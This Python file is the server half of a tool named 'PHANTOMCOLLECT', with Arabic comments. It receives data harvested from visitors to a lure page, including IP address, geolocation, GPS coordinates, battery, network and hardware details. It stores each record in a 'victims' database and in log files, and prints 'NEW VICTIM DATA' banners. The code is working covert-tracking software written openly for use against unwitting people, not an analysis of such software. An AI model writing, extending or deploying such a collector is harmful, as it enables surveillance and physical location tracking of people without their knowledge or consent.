from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import datetime
import sqlite3
import os

class SimpleDataHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        if self.path == '/':
            self.serve_html()
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/api/collect':
            self.handle_data_collection()
        else:
            self.send_error(404)
    
    def serve_html(self):
        try:
            import os
            current_dir = os.path.dirname(os.path.abspath(__file__))
            html_path = os.path.join(current_dir, 'templates', 'collector.html')
            
            with open(html_path, 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f.read())
        except Exception as e:
            print(f"❌ Error serving HTML: {e}")
            self.send_error(404)
    
    def handle_data_collection(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # حفظ في قاعدة البيانات
            self.save_to_db(data)
            
            # طباعة المعلومات في التيرمينال
            self.print_victim_info(data)
            
            # حفظ في ملف نصي
            self.save_to_file(data)
            
            # إرسال رد ناجح
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())
            
        except Exception as e:
            print(f"❌ Error: {e}")
            self.send_error(500)
    
    def save_to_db(self, data):
        conn = sqlite3.connect('victims.db')
        c = conn.cursor()
        
        c.execute('''INSERT INTO victims 
                    (timestamp, ip, user_agent, location, device_info, all_data) 
                    VALUES (?, ?, ?, ?, ?, ?)''',
                 (data['timestamp'],
                  data['collectedData'].get('publicIP', 'Unknown'),
                  data['collectedData']['basicInfo']['userAgent'],
                  self.extract_location(data),
                  self.extract_device_info(data),
                  json.dumps(data, indent=2)))
        
        conn.commit()
        conn.close()
    
    def extract_location(self, data):
        if 'ipGeoInfo' in data['collectedData']:
            geo = data['collectedData']['ipGeoInfo']
            return f"{geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}"
        elif 'gpsLocation' in data['collectedData']:
            gps = data['collectedData']['gpsLocation']
            return f"GPS: {gps['latitude']}, {gps['longitude']}"
        return "Unknown"
    
    def extract_device_info(self, data):
        screen = data['collectedData']['screenInfo']
        return f"{screen['width']}x{screen['height']} - {data['collectedData']['basicInfo']['platform']}"
    
    def save_to_file(self, data):
        if not os.path.exists('logs'):
            os.makedirs('logs')
        filename = f"victim_{data['collectedData'].get('publicIP', 'unknown')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(f"logs/{filename}", 'w') as f:
            json.dump(data, f, indent=2)
    
    def print_victim_info(self, data):
        print(f"\n{'🎯'*20} NEW VICTIM DATA {'🎯'*20}")
        print(f"🕒 Time: {data['timestamp']}")
        
        ip = data['collectedData'].get('publicIP', 'Unknown')
        print(f"🌐 IP: {ip}")
        
        # معلومات الموقع
        if 'ipGeoInfo' in data['collectedData']:
            geo = data['collectedData']['ipGeoInfo']
            print(f"📍 Location: {geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}")
            print(f"🏢 ISP: {geo.get('isp', 'Unknown')}")
        
        # معلومات GPS
        if 'gpsLocation' in data['collectedData']:
            gps = data['collectedData']['gpsLocation']
            print(f"🗺️ GPS: {gps['latitude']}, {gps['longitude']}")
            print(f"🎯 Accuracy: {gps['accuracy']}m")
        
        # معلومات الجهاز
        basic = data['collectedData']['basicInfo']
        screen = data['collectedData']['screenInfo']
        print(f"📱 Platform: {basic['platform']}")
        print(f"🖥️ Screen: {screen['width']}x{screen['height']}")
        
        # البطارية
        if 'batteryInfo' in data['collectedData']:
            bat = data['collectedData']['batteryInfo']
            print(f"🔋 Battery: {bat.get('level', 'Unknown')}%")
        
        # الشبكة
        if 'networkInfo' in data['collectedData']:
            net = data['collectedData']['networkInfo']
            print(f"📡 Network: {net.get('effectiveType', 'Unknown')}")
        
        # المعالج والذاكرة
        if 'hardwareInfo' in data['collectedData']:
            hw = data['collectedData']['hardwareInfo']
            print(f"💾 Memory: {hw.get('deviceMemory', 'Unknown')}GB")
            print(f"⚡ Cores: {hw.get('hardwareConcurrency', 'Unknown')}")
        
        print(f"🌐 User Agent: {basic['userAgent'][:100]}...")
        print(f"{'🎯'*50}")

def init_database():
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  ip TEXT,
                  user_agent TEXT,
                  location TEXT,
                  device_info TEXT,
                  all_data TEXT)''')
    conn.commit()
    conn.close()

def start_server():
    init_database()
    server = HTTPServer(('0.0.0.0', 8080), SimpleDataHandler)
    
    print("🚀 PHANTOMCOLLECT SERVER STARTED")
    print("📍 URL: http://localhost:8080")
    print("⏳ Waiting for victims...\n")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Server stopped!")

if __name__ == '__main__':
    start_server()
